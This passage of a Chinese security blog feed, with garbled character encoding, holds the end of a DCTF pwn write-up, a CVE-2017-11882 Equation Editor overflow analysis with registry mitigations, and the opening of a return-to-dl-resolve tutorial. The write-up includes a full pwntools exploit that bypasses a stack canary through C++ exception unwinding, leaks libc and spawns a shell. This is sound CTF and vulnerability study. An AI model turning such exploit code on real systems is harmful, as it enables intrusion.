class="line">         <span class="built_in">abort</span> ();</span><br><span class="line"></span><br><span class="line">      uw_update_context (context, &amp;fs);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">return</span> code;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>å¦‚ä¸Šä¸¤ä¸ªå‡½æ•°åˆ†åˆ«å¯¹åº”äº† unwind è¿‡ç¨‹ä¸­çš„è¿™ä¸¤ä¸ªé˜¶æ®µï¼Œæ³¨æ„å…¶ä¸­çš„ï¼š</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">bashuw_init_context()</span><br><span class="line">uw_frame_state_for()</span><br><span class="line">uw_update_context()</span><br></pre></td></tr></table></figure><p>è¿™å‡ ä¸ªå‡½æ•°ä¸»è¦æ˜¯ç”¨æ¥é‡å»ºå‡½æ•°è°ƒç”¨ç°åœºçš„ï¼Œæˆ‘ä»¬åªéœ€è¦çŸ¥é“å®ƒä»¬çš„å¾ˆå¤§ä¸€éƒ¨åˆ†ä¸Šä¸‹æ–‡æ˜¯å¯ä»¥ä»å †æ ˆä¸Šæ¢å¤å›æ¥çš„,å¦‚ ebp, esp, è¿”å›åœ°å€ç­‰ã€‚</p><p>è€Œè¿™ä¸ªæ—¶å€™ï¼Œä»æ ˆä¸­æ¢å¤ä¿å­˜çš„ebpå€¼ï¼Œæ˜¯ä»<strong>sub_401148</strong>æˆ–è€…æ˜¯ä»<strong>sub_401148</strong>çš„ä¸Šä¸€å±‚å‡½æ•°çš„ebpå‘¢ï¼Ÿ</p><p><a href="https://blog-1252049492.cos.ap-hongkong.myqcloud.com/img/17-dctf-final-16.jpg" class="gallery-item"><img src="https://blog-1252049492.cos.ap-hongkong.myqcloud.com/img/17-dctf-final-16.jpg"></a></p><p>å…¶å®ä»å¼‚å¸¸æ•è·ç»“æŸåæµç¨‹è·³è½¬åˆ°40155Fæˆ‘ä»¬å°±å¯ä»¥çŸ¥é“äº†ï¼Œè¿™é‡Œçš„leaveï¼Œç›¸å½“äº</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">mov esp,ebp;  æ¢å¤espåŒæ—¶å›æ”¶å±€éƒ¨å˜é‡ç©ºé—´</span><br><span class="line">pop ebp;          ä»æ ˆä¸­æ¢å¤ä¿å­˜çš„ebpçš„å€¼</span><br></pre></td></tr></table></figure><p>è¿™æ ·ä¸€è¿”å›ï¼Œå°±å®Œå…¨è·³è¿‡äº†<br><a href="https://blog-1252049492.cos.ap-hongkong.myqcloud.com/img/17-dcif-final-15.jpg" class="gallery-item"><img src="https://blog-1252049492.cos.ap-hongkong.myqcloud.com/img/17-dcif-final-15.jpg"></a><br>canary çš„æ£€æŸ¥</p><h2 id="æ€è·¯"><a href="#æ€è·¯" class="headerlink" title="æ€è·¯"></a>æ€è·¯</h2><p>å¦‚æœå¼‚å¸¸è¢«ä¸Šä¸€ä¸ªå‡½æ•°çš„catchæ•è·ï¼Œæ‰€ä»¥rbpå˜æˆäº†ä¸Šä¸€ä¸ªå‡½æ•°çš„rbpï¼Œ è€Œé€šè¿‡æ„é€ ä¸€ä¸ªpayloadæŠŠä¸Šä¸€ä¸ªå‡½æ•°çš„rbpä¿®æ”¹æˆstack_pivotåœ°å€ï¼Œ ä¹‹åä¸Šä¸€ä¸ªå‡½æ•°è¿”å›çš„æ—¶å€™æ‰§è¡Œleave retï¼Œè¿™æ ·ä¸€æ¥æˆ‘ä»¬å°±èƒ½æˆåŠŸç»•è¿‡canaryçš„æ£€æŸ¥</p><p>è€Œä¸”è¿›ä¸€æ­¥æˆ‘ä»¬ä¹Ÿèƒ½æ§åˆ¶eipï¼Œï¼Œå»æ‰§è¡Œäº†stack_pivotä¸­çš„ropäº†</p><h3 id="å¯»æ‰¾stack-pivot"><a href="#å¯»æ‰¾stack-pivot" class="headerlink" title="å¯»æ‰¾stack_pivot"></a>å¯»æ‰¾stack_pivot</h3><p><a href="https://blog-1252049492.cos.ap-hongkong.myqcloud.com/img/17-dctf-final-18.jpg" class="gallery-item"><img src="https://blog-1252049492.cos.ap-hongkong.myqcloud.com/img/17-dctf-final-18.jpg"></a></p><p>å¦‚ä½•å»è¦†ç›–rbpå‘¢?</p><figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">message_pattern=<span class="number">0x6061C0</span></span><br><span class="line">ret=<span class="number">0x40150c</span>   </span><br><span class="line">payload1=p64(message_pattern)*<span class="number">37</span>+p64(ret)</span><br></pre></td></tr></table></figure><p>æ„é€ å¦‚æ­¤çš„payloadå»è¦†ç›–rbp<br><a href="https://blog-1252049492.cos.ap-hongkong.myqcloud.com/img/17-dctf-final-19.jpg" class="gallery-item"><img src="https://blog-1252049492.cos.ap-hongkong.myqcloud.com/img/17-dctf-final-19.jpg"></a></p><p>ç´§æ¥ç€æˆ‘ä»¬æ˜¯éœ€è¦å»åšä¸€ä¸ªpayloadå»åšinfoleakï¼Œæ‰€ä»¥æˆ‘ä»¬åˆ©ç”¨æ ˆæº¢å‡ºï¼Œæ„é€ puts å»æ‰“å°puts_got,è·å–putsåœ¨å†…å­˜ä¸­çš„åœ°å€..ç„¶åé€šè¿‡å¼‚å¸¸æœºåˆ¶ç»•è¿‡canaryâ€¦</p><figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">payload2=p64(<span class="number">0</span>)+p64(pop_rdi)+p64(puts_got)+p64(puts_plt)+p64(pop_rdi)+p64(message_pattern+<span class="number">0x50</span>)+p64(pop_rsi_r15)+p64(<span class="number">1024</span>)+p64(message_pattern+<span class="number">0x50</span>)+p64(readn)</span><br></pre></td></tr></table></figure><p><a href="https://blog-1252049492.cos.ap-hongkong.myqcloud.com/img/17-dctf-final-20.jpg" class="gallery-item"><img src="https://blog-1252049492.cos.ap-hongkong.myqcloud.com/img/17-dctf-final-20.jpg"></a></p><p>è°ƒè¯•è¿‡ç¨‹ä¸­ï¼Œæˆ‘ä»¬ä¹Ÿå¯ä»¥çœ‹åˆ°å¼€å§‹åšinfoleakäº†ã€‚ã€‚<br><a href="https://blog-1252049492.cos.ap-hongkong.myqcloud.com/img/17-dctf-final-21.jpg" class="gallery-item"><img src="https://blog-1252049492.cos.ap-hongkong.myqcloud.com/img/17-dctf-final-21.jpg"></a></p><p><a href="https://blog-1252049492.cos.ap-hongkong.myqcloud.com/img/17-dctf-final-22.jpg" class="gallery-item"><img src="https://blog-1252049492.cos.ap-hongkong.myqcloud.com/img/17-dctf-final-22.jpg"></a></p><p>å½“è¿™ä¸ªæ¯”è¾ƒç›¸ç­‰çš„æ—¶å€™ï¼Œä¾¿èƒ½è¿›å…¥å¼‚å¸¸æ•è·çš„æœºåˆ¶äº†â€¦</p><p>éšåï¼Œæˆ‘ä»¬å°±è‡ªç„¶è€Œç„¶çš„è·³è¿‡äº†canaryçš„æ£€æŸ¥â€¦ç„¶åæˆ‘ä»¬åªéœ€è¦åœ¨æ„é€ ä¸€ä¸ªread..å†™ä¸€ä¸ªone_gadget_rceåˆ°stack_pivotä¸Šâ€¦ç„¶åæ§åˆ¶è¿”å›åœ°å€å›stack_pivotä¾¿èƒ½è·å–ä¸€ä¸ªshelläº†â€¦</p><h2 id="å®Œæ•´exp"><a href="#å®Œæ•´exp" class="headerlink" title="å®Œæ•´exp"></a>å®Œæ•´exp</h2><figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python</span></span><br><span class="line"><span class="comment"># coding=utf-8</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">io=process(<span class="string">&quot;./pwn.bak&quot;</span>)</span><br><span class="line"></span><br><span class="line">context.log_level = <span class="string">&#x27;debug&#x27;</span></span><br><span class="line">context.terminal = [<span class="string">&quot;tmux&quot;</span>, <span class="string">&quot;splitw&quot;</span>, <span class="string">&quot;-h&quot;</span>]</span><br><span class="line"><span class="comment">#def attach():</span></span><br><span class="line"><span class="comment">#    gdb.attach(io, execute=&quot;source bp&quot;)</span></span><br><span class="line">libc=ELF(<span class="string">&#x27;/lib/x86_64-linux-gnu/libc.so.6&#x27;</span>)</span><br><span class="line"></span><br><span class="line">io.recvuntil(<span class="string">&quot;option:\n&quot;</span>)</span><br><span class="line">io.sendline(<span class="string">&quot;1&quot;</span>)</span><br><span class="line"><span class="keyword">print</span> io.recvuntil(<span class="string">&quot;(yes/No)&quot;</span>)</span><br><span class="line">io.sendline(<span class="string">&quot;No&quot;</span>)</span><br><span class="line"><span class="keyword">print</span> io.recvuntil(<span class="string">&quot;(yes/No)&quot;</span>)</span><br><span class="line">io.sendline(<span class="string">&quot;yes&quot;</span>)</span><br><span class="line"><span class="keyword">print</span> io.recvuntil(<span class="string">&quot;length:&quot;</span>)</span><br><span class="line">pause()</span><br><span class="line">gdb.attach(io,<span class="string">&#x27;&#x27;&#x27;break *0x400F45</span></span><br><span class="line"><span class="string"> break *0x4012D4</span></span><br><span class="line"><span class="string"> break *0x40153d&#x27;&#x27;&#x27;</span>)</span><br><span class="line">pause()</span><br><span class="line">io.sendline(<span class="string">&#x27;-2&#x27;</span>)</span><br><span class="line">pause()</span><br><span class="line"><span class="keyword">print</span> io.recvuntil(<span class="string">&quot;charset:&quot;</span>)</span><br><span class="line">raw_input(<span class="string">&quot;send payload 1 overwrite stack ebp --&gt; stack_pivot&quot;</span>)</span><br><span class="line">message_pattern=<span class="number">0x6061C0</span></span><br><span class="line">ret=<span class="number">0x40150c</span>   </span><br><span class="line">payload1=p64(message_pattern)*<span class="number">37</span>+p64(ret)  <span class="comment">#overwrite stack ebp --&gt; stack_pivot</span></span><br><span class="line">io.sendline(payload1)</span><br><span class="line">pause()</span><br><span class="line"><span class="keyword">print</span> io.recvuntil(<span class="string">&quot;\n&quot;</span>)</span><br><span class="line">puts_plt=<span class="number">0x400BD0</span></span><br><span class="line">puts_got=<span class="number">0x606020</span></span><br><span class="line">readn=<span class="number">0x400F1E</span>  </span><br><span class="line">pop_rdi=<span class="number">0x4044d3</span></span><br><span class="line">pop_rsi_r15=<span class="number">0x4044d1</span></span><br><span class="line">raw_input(<span class="string">&#x27;send payload 2 to leak puts addr&#x27;</span>)</span><br><span class="line"></span><br><span class="line">payload2=p64(<span class="number">0</span>)+p64(pop_rdi)+p64(puts_got)+p64(puts_plt)+p64(pop_rdi)+p64(message_pattern+<span class="number">0x50</span>)+p64(pop_rsi_r15)+p64(<span class="number">1024</span>)+p64(message_pattern+<span class="number">0x50</span>)+p64(readn)</span><br><span class="line"></span><br><span class="line"><span class="comment"># puts(put@got) -&gt; readn_0x400f1e( stack_pivot + 0x50, 1024 ) one_gadget_addr to ret -&gt; one_gadget</span></span><br><span class="line">io.send(payload2)</span><br><span class="line">pause()</span><br><span class="line">io.recvuntil(<span class="string">&quot;pattern:\n&quot;</span>)</span><br><span class="line">puts=io.recvuntil(<span class="string">&quot;\n&quot;</span>)[:<span class="number">-1</span>]</span><br><span class="line">puts=puts.ljust(<span class="number">8</span>,<span class="string">&quot;\x00&quot;</span>)</span><br><span class="line">puts=u64(puts)</span><br><span class="line">libc_base=puts-libc.symbols[<span class="string">&#x27;puts&#x27;</span>]</span><br><span class="line">one_gadget=libc_base+<span class="number">0xF2519</span></span><br><span class="line">raw_input(<span class="string">&#x27;send payload3 with one gadget rce&#x27;</span>)</span><br><span class="line">payload3=p64(one_gadget)</span><br><span class="line"></span><br><span class="line">io.send(payload3)</span><br><span class="line"></span><br><span class="line"><span class="comment">#due to that the exception_handling program is define in func flex_md5_401500, faked ebp_save will be poped to ebp, when exception_handling program finishes, ip will be set to &#x27;leave retn&#x27; so we can control ip and stack(stack pivot in bss) than leak and exec.</span></span><br><span class="line"></span><br><span class="line">pause()</span><br><span class="line">io.interactive()</span><br><span class="line"></span><br></pre></td></tr></table></figure><h2 id="å‚è€ƒé“¾æ¥"><a href="#å‚è€ƒé“¾æ¥" class="headerlink" title="å‚è€ƒé“¾æ¥"></a>å‚è€ƒé“¾æ¥</h2><p><a href="https://www.cnblogs.com/catch/p/3604516.html">https://www.cnblogs.com/catch/p/3604516.html</a><br><a href="http://baiy.cn/doc/cpp/inside_exception.htm">http://baiy.cn/doc/cpp/inside_exception.htm</a></p></div><script src="https://cdn.jsdelivr.net/lightgallery.js/1.0.1/js/lightgallery.min.js"></script><script>if (typeof lightGallery !== 'undefined') {        var options = {            selector: '.gallery-item'        };        lightGallery(document.getElementsByClassName('.article-gallery')[0], options);        }</script>]]></content>
      
      
      <categories>
          
          <category> Writeup </category>
          
      </categories>
      
      
        <tags>
            
            <tag> pwn </tag>
            
            <tag> DCTF </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>CVE-2017-11882-analyze</title>
      <link href="CVE-2017-11882-analyze.html"/>
      <url>CVE-2017-11882-analyze.html</url>
      
        <content type="html"><![CDATA[<link rel="stylesheet" type="text/css" href="https://cdn.jsdelivr.net/lightgallery.js/1.0.1/css/lightgallery.min.css" /><div class=".article-gallery"<h1 id="é¦–å…ˆ"><a href="#é¦–å…ˆ" class="headerlink" title="é¦–å…ˆ"></a>é¦–å…ˆ</h1><p>æˆ‘ä»Šå¤©æ‰æ‹¿åˆ°æ ·æœ¬ï¼Œå°è¯•ç¨å¾®åˆ†æä¸€ä¸‹ä¸‹</p><p><a href="https://blog-1252049492.cos.ap-hongkong.myqcloud.com/img/cve-2017-11882-01.jpg" class="gallery-item"><img src="https://blog-1252049492.cos.ap-hongkong.myqcloud.com/img/cve-2017-11882-01.jpg"></a></p><p>è¿™ä¸ªæ¼æ´æ˜¯åŸºäºoffcieå…¬å¼ç¼–è¾‘å™¨çš„ä¸€ä¸ªæ ˆæº¢å‡ºã€‚ç”±äºè¯¥å…¬å¼ç¼–è¾‘å™¨å·²ç»æœ‰17å¹´æ²¡æœ‰è¿›ä¸€æ­¥æ›´æ–°ï¼Œè€Œä¸”è¿™ä¸ªå…¬å¼ç¼–è¾‘å™¨å¹¶ä¸æ˜¯ç›´æ¥ä¾æ‰˜äºofficeï¼Œæ‰€ä»¥officeä¸€äº›è½¯ä»¶ä¿æŠ¤ï¼Œè¿™ä¸ªå…¬å¼ç¼–è¾‘å™¨äº‹å®ä¸Šæ˜¯ä¸å­˜åœ¨çš„</p><p><a href="https://blog-1252049492.cos.ap-hongkong.myqcloud.com/img/cve-2017-11882-02.jpg" class="gallery-item"><img src="https://blog-1252049492.cos.ap-hongkong.myqcloud.com/img/cve-2017-11882-02.jpg"></a></p><h1 id="åˆ†æ"><a href="#åˆ†æ" class="headerlink" title="åˆ†æ"></a>åˆ†æ</h1><p>ç»„ä»¶ä½ç½®ä½äº  <code>C:\Program Files (x86)\Common Files\microsoft shared\EQUATION\EQNEDT32.EXE</code></p><h1 id="æ¼æ´ä½ç½®"><a href="#æ¼æ´ä½ç½®" class="headerlink" title="æ¼æ´ä½ç½®"></a>æ¼æ´ä½ç½®</h1><p><a href="https://blog-1252049492.cos.ap-hongkong.myqcloud.com/img/cve-2017-11882-03.jpg" class="gallery-item"><img src="https://blog-1252049492.cos.ap-hongkong.myqcloud.com/img/cve-2017-11882-03.jpg"></a></p><p>004164FAåœ°å€çš„åŠŸèƒ½ä¸»è¦æ˜¯ä»å†…éƒ¨è¡¨å•å¤åˆ¶ä»¥ç©ºå­—ç¬¦ç»“å°¾çš„å­—ç¬¦ä¸²ä½œä¸ºç¬¬ä¸€ä¸ªå‚æ•°å‘é€ç»™å®ƒçš„ç¼“å†²åŒº</p><p>ç¨‹åºå¯ä»¥ä»å¦å¤–ä¸¤ä¸ªç¨‹åºä¸­è°ƒç”¨ã€‚ä»–ä»¬éƒ½å°†å›ºå®šé•¿åº¦çš„å †æ ˆæ•°æ®ä¼ é€’ç»™å®ƒã€‚è¿™ä¸¤ä¸ªè¿‡ç¨‹æ›´é‡è¦çš„æ˜¯å®¹æ˜“å—åˆ°ç¼“å†²åŒºæº¢å‡ºçš„å½±å“ã€‚å‘ç°ç¬¬ä¸€ä¸ªè°ƒç”¨ä¸EqnFrameWinProcå‡½æ•°ä¸­å¤„ç†çš„æŸä¸ªçª—å£æ¶ˆæ¯æœ‰å…³ã€‚æ¢å¥è¯è¯´ï¼Œåˆ©ç”¨è¿™ä¸ªç”µè¯æ˜¯ä¸å¹³å‡¡çš„ä»»åŠ¡ã€‚</p><p>ç¬¬äºŒä¸ªè°ƒç”¨åˆä¸å¤„ç†ä»ç­‰å¼äºŒè¿›åˆ¶å½¢å¼å¤åˆ¶çš„å­—ä½“åç§°æœ‰å…³ã€‚è°ƒç”¨å¯ä»¥é€šè¿‡è°ƒç”¨IPersistStorage :: Loadæ¥æ‰§è¡Œã€‚ä½†æ˜¯ï¼Œç›´æ¥ä½¿ç”¨è¯¥å‡½æ•°æ˜¯ä¸å¯èƒ½çš„ï¼Œå› ä¸ºå¦‚æœæº¢å‡ºäº†ï¼Œå°±ä¼šè°ƒç”¨å¦ä¸€ä¸ªæº¢å‡ºçš„è¿‡ç¨‹ã€‚ç¬¬ä¸€ä¸ªå‡½æ•°çš„ç¼“å†²åŒºå¤ªå¤§ï¼Œä¼šè¦†ç›–ç¬¬äºŒä¸ªå‡½æ•°çš„æ‰€æœ‰å‚æ•°ï¼Œåœ¨æ‰§è¡Œçš„æ—¶å€™ä¼šè®¿é—®æ— æ•ˆçš„å†…å­˜ä½ç½®ã€‚å› æ­¤ï¼Œç»„ä»¶è¿›ç¨‹å°†ä¼šå´©æºƒï¼Œç›´åˆ°æ”»å‡»è€…æ§åˆ¶çš„ä»£ç è¢«æ‰§è¡Œã€‚ä¸ºäº†æ–¹ä¾¿èµ·è§ï¼Œåœ¨ç ”ç©¶èŒƒå›´å†…ï¼Œæˆ‘ä»¬å°†å…¶å‘½åä¸ºLogfontStruct_Overflowã€‚è¯¥å‡½æ•°å…·æœ‰00421774åœ°å€ï¼Œå¹¶åœ¨LOGFONTAç»“æ„ä¸­æº¢å‡ºç¼“å†²åŒº</p><p><a href="https://blog-1252049492.cos.ap-hongkong.myqcloud.com/img/cve-2018-11882-04.jpg" class="gallery-item"><img src="https://blog-1252049492.cos.ap-hongkong.myqcloud.com/img/cve-2018-11882-04.jpg"></a></p><h1 id="åˆ©ç”¨"><a href="#åˆ©ç”¨" class="headerlink" title="åˆ©ç”¨"></a>åˆ©ç”¨</h1><p>åœ¨è¿™ç§æƒ…å†µä¸‹ï¼Œret2libcéœ€è¦æ‰§è¡Œä»»æ„ä»£ç ã€‚æ¥è‡ªEQNEDT32.EXEçš„å·²çŸ¥è®¾ç½®åœ°å€çš„ç¬¬ä¸€ä¸ªå­—èŠ‚æ˜¯é›¶å­—èŠ‚ã€‚è¿™å°±æ˜¯ä¸ºä»€ä¹ˆä¸å¯èƒ½ä»å¯æ‰§è¡Œæ–‡ä»¶å¤åˆ¶ç”±å°å·¥å…·æ„å»ºçš„ROPé“¾ï¼ˆç»„ä»¶ä¸­ä¹Ÿå­˜åœ¨æ½œåœ¨çš„æ¼æ´ï¼‰ã€‚</p><p>ç»„ä»¶çš„è¿‡æ—¶å¯¼è‡´ä»¥ä¸‹ç»“æœï¼š<br>EQNEDT32.EXEå¼€å‘äººå‘˜è¦æ±‚WinExecå‡½æ•°æœ‰ä¸€äº›æœªçŸ¥çš„åŸå› ã€‚<br>æœ€åæè¿°çš„åŠŸèƒ½åŸæ¥æ˜¯ä¸€ä¸ªå®Œç¾çš„é€‚åˆWinExecã€‚<br>ç¬¬2ç‚¹æ˜¯å¯èƒ½çš„ï¼Œå› ä¸ºå¼•èµ·ç¼“å†²åŒºæº¢å‡ºçš„å‡½æ•°æ˜¯æº¢å‡ºå‡½æ•°çš„ç¬¬ä¸€ä¸ªå‚æ•°ã€‚ç¬¬äºŒä¸ªå‚æ•°æ˜¯NULLã€‚</p><p>å…¬å¼çš„å†…å®¹ä½¿ç”¨äº†ä¸€ç§åä¸ºMTEF v.3çš„äºŒè¿›åˆ¶æ ¼å¼è¿›è¡Œå­˜å‚¨ã€‚è¯¥æ ¼å¼çš„å¤´éƒ¨ä¸º28ï¼ˆ0x1Cï¼‰ä¸ªå­—èŠ‚ï¼Œå®šä¹‰å¦‚ä¸‹ï¼š<br>ä»¥å·²ç»æœ‰çš„pocä½œä¸ºè°ƒè¯•å¯¹è±¡</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">struct EQNOLEFILEHDR &#123;</span><br><span class="line"></span><br><span class="line">   WORD    cbHdr;      &#x2F;&#x2F; æ ¼å¼å¤´é•¿åº¦ï¼Œå›ºå®šä¸º0x1Cã€‚</span><br><span class="line"></span><br><span class="line">   DWORD   version;    &#x2F;&#x2F; å›ºå®šä¸º0x00020000ã€‚</span><br><span class="line"></span><br><span class="line">   WORD    cf;          &#x2F;&#x2F; è¯¥å…¬å¼å¯¹è±¡çš„å‰ªè´´æ¿æ ¼å¼ã€‚</span><br><span class="line"></span><br><span class="line">   DWORD   cbObject;  &#x2F;&#x2F; MTEFæ•°æ®çš„é•¿åº¦ï¼Œä¸åŒ…æ‹¬å¤´éƒ¨ã€‚</span><br><span class="line"></span><br><span class="line">   DWORD   reserved1; &#x2F;&#x2F; æœªå…¬å¼€</span><br><span class="line"></span><br><span class="line">   DWORD   reserved2; &#x2F;&#x2F; æœªå…¬å¼€</span><br><span class="line"></span><br><span class="line">   DWORD   reserved3; &#x2F;&#x2F; æœªå…¬å¼€</span><br><span class="line"></span><br><span class="line">   DWORD   reserved4; &#x2F;&#x2F; æœªå…¬å¼€</span><br><span class="line"></span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><p>æ”»å‡»è€…å¯èƒ½æº¢å‡ºçš„æ•°ç»„å¤§å°ä¸º36ä¸ªå­—èŠ‚ï¼‰ã€‚è€Œä¸”ï¼Œå¯ä»¥ä½¿ç”¨v12å˜é‡å’Œä¿å­˜çš„EBPçš„ç©ºé—´ï¼Œè¿™åˆå¢åŠ äº†8ä¸ªå­—èŠ‚ã€‚</p><p>é€šè¿‡æ’å…¥å¤šä¸ªåˆ©ç”¨æ‰€è¿°æ¼æ´çš„OLEï¼Œå¯ä»¥æ‰§è¡Œä»»æ„å‘½ä»¤åºåˆ—ï¼ˆä¾‹å¦‚ï¼Œä»Internetä¸Šä¸‹è½½ä»»æ„æ–‡ä»¶å¹¶æ‰§è¡Œå®ƒï¼‰ã€‚</p><h1 id="è§£å†³æ–¹æ¡ˆï¼š"><a href="#è§£å†³æ–¹æ¡ˆï¼š" class="headerlink" title="è§£å†³æ–¹æ¡ˆï¼š"></a>è§£å†³æ–¹æ¡ˆï¼š</h1><p>1ã€å¾®è½¯å·²ç»å¯¹æ­¤æ¼æ´åšå‡ºäº†ä¿®å¤ã€‚</p><p>(1)ä¸‹è½½<a href="https://portal.msrc.microsoft.com/en-US/security-guidance/advisory/CVE-2017-11882">https://portal.msrc.microsoft.com/en-US/security-guidance/advisory/CVE-2017-11882</a>  æ›´æ–°è¡¥ä¸è¿›è¡Œä¿®è¡¥</p><p>(2)å¼€å¯Windows UpdateåŠŸèƒ½ï¼Œå®šæœŸå¯¹ç³»ç»Ÿè¿›è¡Œè‡ªåŠ¨æ›´æ–°<br>2ã€ç”±äºè¯¥å…¬å¼ç¼–è¾‘å™¨å·²ç»17å¹´æœªåšæ›´æ–°ï¼Œå¯èƒ½å­˜åœ¨å¤§é‡å®‰å…¨æ¼æ´ï¼Œå»ºè®®åœ¨æ³¨å†Œè¡¨ä¸­å–æ¶ˆè¯¥æ¨¡å—çš„æ³¨å†Œã€‚</p><p>l  æŒ‰ä¸‹Win+Rç»„åˆé”®ï¼Œæ‰“å¼€cmd.exe</p><p>l  è¾“å…¥ä»¥ä¸‹ä¸¤æ¡å‘½ä»¤ï¼š</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">reg add  â€œHKLM\SOFTWARE\Microsoft\Office\Common\COM     Compatibility\&#123;0002CE02-0000-0000-C000-000000000046&#125; â€ &#x2F;v         â€œCompatibility  Flagsâ€             &#x2F;t  REG_DWORD &#x2F;d                 0x400                </span><br><span class="line"> </span><br><span class="line"></span><br><span class="line">        </span><br><span class="line"> </span><br><span class="line">reg add  â€œHKLM\SOFTWARE\Wow6432Node\Microsoft\Office\Common\COM     Compatibility\&#123;0002CE02-0000-0000-C000-000000000046&#125; â€ &#x2F;v         â€œCompatibility  Flagsâ€             &#x2F;t  REG_DWORD &#x2F;d                 0x400 </span><br></pre></td></tr></table></figure></div><script src="https://cdn.jsdelivr.net/lightgallery.js/1.0.1/js/lightgallery.min.js"></script><script>if (typeof lightGallery !== 'undefined') {        var options = {            selector: '.gallery-item'        };        lightGallery(document.getElementsByClassName('.article-gallery')[0], options);        }</script>]]></content>
      
      
      <categories>
          
          <category> æ¼æ´åˆ†æ </category>
          
      </categories>
      
      
        <tags>
            
            <tag> pwn </tag>
            
            <tag> CVE-2017-11882 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>return-to-dl-resolve</title>
      <link href="Return-to-dl-resolve.html"/>
      <url>Return-to-dl-resolve.html</url>
      
        <content type="html"><![CDATA[<link rel="stylesheet" type="text/css" href="https://cdn.jsdelivr.net/lightgallery.js/1.0.1/css/lightgallery.min.css" /><div class=".article-gallery"<h3 id="é€šè¿‡ELFåŠ¨æ€è£…è½½æ„é€ ROPé“¾-ï¼ˆ-Return-to-dl-resolveï¼‰"><a href="#é€šè¿‡ELFåŠ¨æ€è£…è½½æ„é€ ROPé“¾-ï¼ˆ-Return-to-dl-resolveï¼‰" class="headerlink" title="é€šè¿‡ELFåŠ¨æ€è£…è½½æ„é€ ROPé“¾ ï¼ˆ Return-to-dl-resolveï¼‰"></a>é€šè¿‡ELFåŠ¨æ€è£…è½½æ„é€ ROPé“¾ ï¼ˆ Return-to-dl-resolveï¼‰</h3><p>####0x00 å‰è¨€<br>ç©CTFçš„èµ›æ£éƒ½çŸ¥é“ï¼ŒPWNç±»å‹çš„æ¼æ´é¢˜ç›®ä¸€èˆ¬ä¼šæä¾›ä¸€ä¸ªå¯æ‰§è¡Œç¨‹åºï¼ŒåŒæ—¶ä¼šæä¾›ç¨‹åºè¿è¡ŒåŠ¨æ€é“¾æ¥çš„libcåº“ã€‚é€šè¿‡libc.soå¯ä»¥å¾—åˆ°åº“å‡½æ•°çš„åç§»åœ°å€ï¼Œå†ç»“åˆæ³„éœ²GOTè¡¨ä¸­libcå‡½æ•°çš„åœ°å€ï¼Œè®¡ç®—å‡ºè¿›ç¨‹ä¸­å®é™…å‡½æ•°çš„åœ°å€ï¼Œä»¥ç»•è¿‡ASLRã€‚è¿™ç§æ‰‹æ³•å«return-to-libcã€‚æœ¬æ–‡å°†ä»‹ç»ä¸€ç§ä¸ä¾èµ–libcçš„æ‰‹æ³•ã€‚</p><p>ä»¥XDCTF2015-EXPLOIT2ä¸ºä¾‹ï¼Œè¿™é¢˜å½“æ—¶æ˜¯åªç»™äº†å¯æ‰§è¡Œæ–‡ä»¶çš„ã€‚å‡ºè¿™é¢˜çš„åˆè¡·å°±æ˜¯æƒ³é€šè¿‡Return-to-dl-resolveçš„æ‰‹æ³•ç»•è¿‡NXå’ŒASLRçš„é™åˆ¶ã€‚æœ¬æ–‡å°†è¯¦ç»†ä»‹ç»ä¸€ä¸‹è¯¥æ‰‹æ³•çš„åˆ©ç”¨è¿‡ç¨‹ã€‚</p><p>è¿™é‡Œæ„é€ ä¸€ä¸ªå­˜åœ¨æ 